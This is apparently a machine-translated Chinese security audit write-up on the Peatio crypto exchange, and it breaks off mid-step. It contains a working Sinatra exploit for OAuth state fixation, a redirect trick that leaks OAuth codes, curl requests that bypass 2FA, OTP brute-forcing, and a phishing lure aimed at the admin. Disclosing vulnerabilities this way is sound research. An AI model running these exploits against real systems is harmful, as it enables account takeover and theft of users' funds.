一段时间以来，我们一直在寻找一个进行志愿者安全审核的项目。最近，我们为我们找到了一个完美的选择-由Rails提供支持的开源加密货币交易所Peatio。

我们花了8个小时来寻找一种方法，以解决比特币交易所可以做的最坏的事情-窃取热钱包。该任务已部分完成，我们发现了一系列有趣的关键漏洞。

步骤1.劫持帐户


Peatio内置了“连接微博帐户”功能。根据OAuth安全备忘单，OAuth的实施不当是一种接管帐户的可靠方法。

将攻击者的微博帐户连接到受害者的Peatio帐户

omniauth-weibo-oauth2 gem容易受到状态修复的攻击。我们可以将state设置为任意值（例如123），然后改用state = 123来应用攻击者的代码，这将导致将攻击者的微博分配给受害者的对等帐户。完全相同的问题是在omniauth-facebook gem和其他基于omniauth的库中复制了相同的易受攻击的代码。有趣的是，上面的评论说“支持omniauth-oauth2的自动csrf保护”，但相反，将其关闭。

该错误可通过以下Sinatra应用程序加以利用，只需添加YourWeiboCookies：

require 'sinatra'get '/get_weibo_cb' do
  conn = Faraday.new(:url => 'https://api.weibo.com')  new_url = conn.get do |r|    r.url "/oauth2/authorize?client_id=456519107&redirect_uri=https%3A%2F%2Fyunbi.com%2Fauth%2Fweibo%2Fcallback&response_type=code&state=123"
    r.headers['Cookie'] =<<COOKIEYourWeiboCookiesCOOKIE
    r.options.timeout = 4            r.options.open_timeout = 2  end.headers["Location"]  redirect new_urlend
get '/peatio_demo' do  response.headers['Content-Security-Policy'] = "img-src 'self' https://yunbi.com"  "<img src='https://yunbi.com/auth/weibo?state=123'><img src='/get_weibo_cb'>"end
如果用户已经连接了微博怎么办？

该系统不会连接另一个微博帐户，但我们希望该漏洞利用程序能够对每个可能的受害者无缝运行。因此，我们入侵了微博的OAuth。

首先，我们发现微博没有redirect_uri像Github一样不在白名单中。可以切换redirect_uri到受害者域上的另一个页面以泄漏codeReferrer标头中的内容，然后使用它登录受害者的帐户。

但是，在Peatio上没有这样的页面来使其泄漏。没有外部图像，链接或其他任何内容。攻击面很小。但后来我们在DocumentsController：

if not @doc  redirect_to(request.referer || root_path)  returnend

跟随重定向链通过首先将代码放入#片段中来泄漏代码。

  1. attacker_page 重定向到 weibo.com/authorize?...redirect_uri=https://app/documents/not_existing_doc%23...

  2. 微博无法正确解析redirect_uri，并将受害者重定向到https://app/documents/not_existing_doc#?code=VALID_CODE

  3. Peatio无法找到not_existing_doc并发送等于请求头的Location标头。referer仍然是Attacker_page （浏览器在重定向时保留了此标头）

  4. 浏览器保留#?code=VALID_CODE片段并加载attacker_page#?code=VALID_CODE。现在，可以通过JS使用JS泄漏代码location.hash。该代码可用于https://app/auth/weibo/callback登录受害者的帐户。

因此，使用上述两个错误，我们可以劫持任何对等账户，并且只有最后一个需要JS。

步骤2：绕过2要素验证

对于已激活Google Authenticator的用户

SmsAuthsController中有一个漏洞-two_factor_required!仅被要求show采取行动，而update实际上并不是由其负责激活SMS 2FA。

before_action :auth_member!before_action :find_sms_authbefore_action :activated?before_action :two_factor_required!, only: [:show]
def show  @phone_number = Phonelib.parse(current_user.phone_number).nationalend
def update  if params[:commit] == 'send_code'    send_code_phase  else    verify_code_phase  endend

我们可以直接发送以下请求来激活新的SMS身份验证器update。

curl ‘https://app/verify/sms_auth’ -H ‘X-CSRF-Token:ZPwrQuLJ3x7md3wolrCTE6HItxkwOiUNHlekDPRDkwI=’ -H ‘Cookie:_peatio_session=SID’ –data ‘_method=patch&sms_auth%5Bcountry%5D=DE&sms_auth%5B phone_number%5D=9123222211&commit=send_code’


curl ‘https://app/verify/sms_auth’ -H ‘X-CSRF-Token:ZPwrQuLJ3x7md3wolrCTE6HItxkwOiUNHlekDPRDkwI=’ -H ‘Cookie:_peatio_session=SID’ –data ‘_method=patch&sms_auth%5Bcountry%5D=DE&sms_auth%5B phone_number%5D=9123222211&sms_auth%5Botp%5D=CODE_WE_RECEIVED’

对于同时具有Authenticator和SMS的用户

Peatio不会存储OTP失败的尝试，因此可以很容易地同时暴力破解App和SMS OTP，这将花费不到3天的时间。有关更多详细信息，请检查我们的OTP Bruteforce计算器

仅限使用SMS 2FA的用户

two_factor_by_type方法不使用activated范围，因此即使不活动的2FA模型也可以使用。因此，由于受害者将开始接收可疑的SMS，因此我们不会暴力破解SMS身份验证。我们仍然可以蛮力地使用Google Authenticator，因为它已经生成了种子并且verify?方法运行良好。

def two_factor_by_type  current_user.two_factors.by_type(params[:id])end
此外，SMS 2FA还有两个问题
def gen_code  self.otp_secret = OTP_LENGTH.times.map{ Random.rand(9) + 1 }.join  self.refreshed_at = Time.nowend


第一个问题是Random.rand基于PRNG（Mersenne Twister）的，一旦有了足够的后续生成的数字，就可以很容易地预测到它。

第二个问题是rand(9)只能生成0到8之间的数字，因此组合总数将为9 ^ 6 = 531441，几乎比1,000,000少两倍，并且比App 2FA暴力破解更容易两倍。

通过上面概述的技巧，我们可以为任何用户跳过2FA。在最坏的情况下，它需要不到3天的时间。如果受害者只有Google Authenticator，则只需不到5秒钟即可设置新的SMS身份验证器。

步骤3：攻击管理员

好了，我们可以劫持该帐户并为任何用户绕过2FA，因此我们可以从访问我们页面的任何人那里窃取比特币。仍然，我们仍然需要大量用户来诱骗点击我们的虚假链接。让我们只关注其中之一-管理员。

使管理员访问我们链接的最简单方法是创建一个支持票，其内容为“我的帐户有什么问题，请检查吗？https://i.will.hack.you/now”。然后，我们破解2FA进入/admin面板：
